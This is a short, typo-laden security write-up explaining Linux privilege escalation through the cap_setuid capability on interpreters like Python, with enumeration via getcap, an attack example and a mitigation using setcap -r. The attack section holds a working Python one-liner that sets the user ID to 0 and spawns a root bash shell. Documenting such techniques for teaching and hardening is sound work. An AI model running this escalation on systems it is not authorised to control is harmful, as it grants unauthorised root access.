# Privilege Escalation: Abouse of Linux Capabilities

## 1. Definitioin
*Capabilities* in Linux are a security mechanism that allows you to grant specific `root` privileges to program or binary, without having to give it full access through SUID permissions However, assigning the `cap_setuid` capability to a command interpreter or programming language (such as Python, Perl, Ruby, PHP) breaks the security model.

The `cap_setuid` (Set User ID) capability grants the absolute power to change the identifier of the user running the process to any other ID, including `0` (root).

## 2. Impact
**Full System Compromise (Root):** Any unprivileged user who can run the vulnerable binary can immediately escalate their permissions to `root`.

## 3. Attack Ecample

During the local enumeration phase, the system is searched for binaries with capabilities assigned using LinPEAS or the manual command:
```bash
getcap -r / 2>/dev/null

# Find:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
Python 3.8 was detected to hace the cap_setuid capability assigned.

Explotation:
Python is executed passing instructions to change its user ID to 0 (root) and the deploy a bash shell inheriting those privileges:

```python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 4. Mitigation

**Least Privilege Principle:** Never assign cap_setuid to command interpreters (Python, Bash, Perl, etc.), text editors (Vim, Nano), or transfer tools (Tar, SCP).

Remove the capability from the binary if it is not strictly necessary for system operation:

```bash
setcap -r /usr/bin/python3.8
```

